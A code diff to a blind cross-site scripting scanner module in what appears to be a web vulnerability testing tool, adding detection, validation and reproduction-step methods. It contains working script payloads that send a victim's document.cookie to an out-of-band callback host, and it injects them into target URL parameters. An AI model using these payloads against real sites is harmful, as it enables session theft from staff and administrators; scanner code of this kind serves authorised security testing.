@@ -17,7 +17,7 @@ from modules.utils import (
     safe_get, safe_post, finding, log, Colors, _build_curl,
     VerificationStage,
 )
-from scanners.base import ScannerBase
+from scanners.base import ScannerBase, DetectionResult, ValidationResult
 
 
 class BlindXSSScanner(ScannerBase):
@@ -45,7 +45,27 @@ class BlindXSSScanner(ScannerBase):
             f'<script>new Image().src="http://{token}.{oob_host}/blind?c="+document.cookie</script>',
         ]
 
+    def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
+        return DetectionResult(url=url, parameter=parameter or "", payload="blind_xss", context="oob_required")
+
+    def validate(self, detection: DetectionResult) -> ValidationResult | None:
+        return ValidationResult(confirmed=False, method="oob", detail="Blind XSS requires OOB callback")
+
+    def collect_evidence(self, detection: DetectionResult,
+                         validation_result: ValidationResult | None = None) -> list:
+        return []
+
+    def generate_reproduction(self, detection: DetectionResult,
+                              validation_result: ValidationResult | None = None) -> list[str]:
+        return [
+            f"Submit payload at {detection.url} with blind XSS payload injected into a text input field",
+            "Blind XSS payload: <script>fetch('http://<oob-host>/exfil?c='+document.cookie)</script>",
+            "Wait for a staff/admin user to view the page containing the stored payload",
+            "Observe OOB callback on listener containing victim's cookies, session token, or page content — confirms stored XSS execution in victim's browser",
+        ]
+
     def scan(self, target_urls: list[str] | None = None) -> list[dict]:
+        self._prepare_scan()
         oob_host = self.validation.callback_host
         if not oob_host:
             log("[!] Blind XSS skipped — provide --oob-host for OOB callback verification", Colors.YELLOW)
@@ -84,13 +104,11 @@ class BlindXSSScanner(ScannerBase):
                 continue
             for param in parse_qs(urlparse(url).query).keys():
                 for payload in self._oob_payloads[:2]:
-                    from urllib.parse import urlencode
                     parsed = urlparse(url)
                     qs = parse_qs(parsed.query, keep_blank_values=True)
                     qs[param] = [payload]
-                    new_qs = urlencode(qs, doseq=True)
-                    from urllib.parse import urlunparse
-                    test_url = urlunparse(parsed._replace(query=new_qs))
+                    new_qs = _urlencode(qs, doseq=True)
+                    test_url = parsed._replace(query=new_qs).geturl()
                     safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                     self.validation.register_oob("blind_xss", payload, test_url)
                     self._oob_urls.append(("blind_xss", payload, test_url))
@@ -116,11 +134,9 @@ class BlindXSSScanner(ScannerBase):
                 request=_build_curl("POST", url_str, dict(self.session.headers), data={"field": "(blind xss payload)"}) if url_str else "",
                 response_excerpt="(confirmed via OOB callback — JavaScript executed in victim browser)",
                 verification_stage=VerificationStage.VERIFIED.value,
-                steps_to_reproduce=[
-                    f"Inject Blind XSS payload into form field at {url_str}",
-                    "When victim/staff views the stored content, the payload executes",
-                    "Observe OOB callback containing victim's cookie, session, or page content",
-                ],
+                steps_to_reproduce=self.generate_reproduction(
+                    DetectionResult(url=url_str, parameter="", payload="blind_xss", context="oob_required")
+                ),
             )
             if f:
                 self.evidence_engine.store(ev)
